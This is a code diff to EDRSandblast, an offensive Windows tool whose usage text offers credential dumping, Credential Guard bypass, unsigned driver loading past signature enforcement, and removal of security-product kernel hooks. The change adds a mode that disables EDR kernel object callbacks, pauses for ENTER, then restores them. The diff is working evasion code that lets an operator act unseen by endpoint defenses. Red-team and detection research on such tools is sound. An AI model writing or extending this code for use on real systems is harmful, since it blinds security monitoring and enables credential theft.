@@ -91,7 +91,7 @@ BOOL WasRestarted() {
 
 int _tmain(int argc, TCHAR** argv) {
     // Parse command line arguments and initialize variables to default values if needed.
-    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall | load_unsigned_driver | toggle_callbacks [0|1] > \n\
+    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall | load_unsigned_driver | toggle_callbacks [0|1|01] > \n\
 [--usermode] [--unhook-method <N>] [--direct-syscalls] [--add-dll <dll name or path>]* \n\
 [--kernelmode] [--dont-unload-driver] [--no-restore] \n\
     [--nt-offsets <NtoskrnlOffsets.csv>] [--fltmgr-offsets <FltmgrOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--ci-offsets <CiOffsets.csv>] [--internet]\n\
@@ -114,7 +114,7 @@ Actions mode:\n\
 \tfirewall                  Add Windows firewall rules to block network access for the EDR processes / services.\n\
 \tload_unsigned_driver      Load the specified unsigned driver, bypassing Driver Signature Enforcement (DSE).\n\
 \t                          WARNING: currently an experimental feature, only works if KDP is not present and enabled.\n\
-\ttoggle_callbacks          Enables (1) or disables (0) the kernel callbacks related to EDRs.\n\
+\ttoggle_callbacks          Disables (0), Enables (1), or Disable-wait-Enable (01) the kernel callbacks related to EDRs.\n\
 \n\
 --usermode              Perform user-land operations (DLL unhooking).\n\
 --kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).\n\
@@ -202,7 +202,8 @@ Dump options:\n\
     }
 
     START_MODE startMode = none;
-    BOOL disableCallbacks = FALSE;
+	enum disableCallback { DISABLE, ENABLE, DISABLE_WAIT_ENABLE };
+    enum disableCallback toggle_option;
     TCHAR driverPath[MAX_PATH] = { 0 };
     TCHAR unsignedDriverPath[MAX_PATH] = { 0 };
     TCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
@@ -259,7 +260,19 @@ Dump options:\n\
                 _tprintf_or_not(TEXT("%s"), usage);
                 return EXIT_FAILURE;
             }
-            disableCallbacks = (_tcsicmp(argv[i], TEXT("0")) == 0) ? TRUE : FALSE;
+            if (_tcsicmp(argv[i], TEXT("0")) == 0) {
+				toggle_option = DISABLE;
+			}
+            else if (_tcsicmp(argv[i], TEXT("1")) == 0) {
+                toggle_option = ENABLE;
+            } 
+            else if (_tcsicmp(argv[i], TEXT("01")) == 0) {
+                toggle_option = DISABLE_WAIT_ENABLE;
+            }
+            else {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
         }
         else if (_tcsicmp(argv[i], TEXT("-h")) == 0 || _tcsicmp(argv[i], TEXT("--help")) == 0) {
             _putts_or_not(usage);
@@ -949,22 +962,35 @@ Dump options:\n\
 
     if (startMode == toggle_callbacks) {
         _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication..."));
-        foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers, TRUE);
-        _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
-        if (foundObjectCallbacks) {
-            isSafeToExecutePayloadKernelland = FALSE;
-        }
-        _putts_or_not(TEXT(""));
 
-        if (disableCallbacks) {
-            _putts_or_not(TEXT("[+] Disabling all EDR callbacks..."));
-            DisableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
+        if (toggle_option == DISABLE || toggle_option == DISABLE_WAIT_ENABLE) {
+            foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers, FALSE);
+            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
+            if (foundObjectCallbacks) {
+                _putts_or_not(TEXT("[+] Disabling all EDR callbacks..."));
+                DisableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
+                if (toggle_option == DISABLE_WAIT_ENABLE) {
+                    _tprintf_or_not(TEXT("\n[+] Press ENTER to enable callbacks again: "));
+                    fgetc(stdin); // wait for ENTER
+                    _putts_or_not(TEXT("\n[*] Re-enabling all EDR callbacks..."));
+                    EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
+				}
+            }
+            else {
+                _putts_or_not(TEXT("[*] No EDR callbacks found, nothing to disable"));
+			}
         }
-        else {
-            _putts_or_not(TEXT("[+] Enabling all EDR callbacks..."));
-            EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
+        if (toggle_option == ENABLE) {
+            foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers, TRUE);
+            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
+            if (foundObjectCallbacks) {
+                _putts_or_not(TEXT("[+] Enabling all EDR callbacks..."));
+                EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
+            }
+            else {
+                _putts_or_not(TEXT("[*] No EDR callbacks found, nothing to enable"));
+            }
         }
-        _putts_or_not(TEXT("[+] All EDR callbacks toggled."));
     }
 
     if (kernelMode && removeVulnDriver) {
